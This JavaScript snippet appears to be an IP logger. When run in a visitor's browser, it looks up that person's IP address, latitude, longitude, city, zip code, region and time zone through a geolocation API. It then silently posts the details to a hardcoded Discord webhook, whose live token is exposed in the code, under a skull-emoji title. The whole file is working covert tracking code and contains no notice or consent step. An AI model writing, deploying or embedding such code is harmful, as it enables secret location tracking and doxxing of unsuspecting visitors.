var ip = '';
fetch('https://freeipapi.com/api/json')
.then(function(response) {
    return response.json();
})
.then(function(data) {
    IPv = data.ipVersion;
    ip = data.ipAddress;
    latitude = data.latitude;
    longitude = data.longitude;
    country = data.countryName
    countryCode = data.countryCode;
    timeZone = data.timeZone;
    zipCode = data.zipCode;
    city = data.cityName;
    region = data.regionName;
    var webhook = 'https://canary.discord.com/api/webhooks/1125397059659386950/MyAiV8-908g6vNHkLOcZTP8TrqFta3_gXWzfevHmWGUxhKXeR2vBbyd9Z0H3qx52WK1V'
    var message = {
        "content": "",
        "tts": false,
        "embeds": [
          {
            "id": 773268010,
            "description": `IPv - ${IPv}\nIP - ${ip}\nLatitude - ${latitude}\nLongitude - ${longitude}\nCountry - ${country}\nCountry code - ${countryCode}\nTime zone - ${timeZone}\nZip Code - ${zipCode}\nCity - ${city}\nRegion - ${region}`,
            "fields": [],
            "footer": {
              "text": ";3",
              "icon_url": "https://cdn.discordapp.com/attachments/1121146707154043037/1125460524507865089/image_2023-07-03_181713497.png"
            },
            "color": 15663879,
            "title": "💀"
          }
        ],
        "components": [],
        "actions": {}
      }

    fetch(webhook, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
    });
});